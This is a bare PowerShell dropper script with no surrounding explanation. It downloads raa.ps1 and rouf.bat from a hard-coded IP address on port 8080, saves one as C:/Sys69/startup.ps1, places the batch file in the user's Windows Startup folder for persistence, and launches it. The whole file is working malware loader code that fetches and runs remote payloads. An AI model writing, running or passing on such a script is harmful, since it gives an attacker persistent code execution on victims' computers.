$curpath = Get-Location;
$WebClient = New-Object System.Net.WebClient;

Set-Location /;
if (Test-Path -Path "Sys69") {

}
else {
    mkdir Sys69;
}
Set-Location Sys69;
$WebClient.DownloadFile("http://139.162.197.217:8080/raa.ps1","C:/Sys69/startup.ps1");
Set-Location $curpath;
Set-Location "AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
$startupdir = Get-Location;
$WebClient.DownloadFile("http://139.162.197.217:8080/rouf.bat", $startupdir+"/rouf.bat");
Start-Process -FilePath $startupdir+"/rouf.bat"

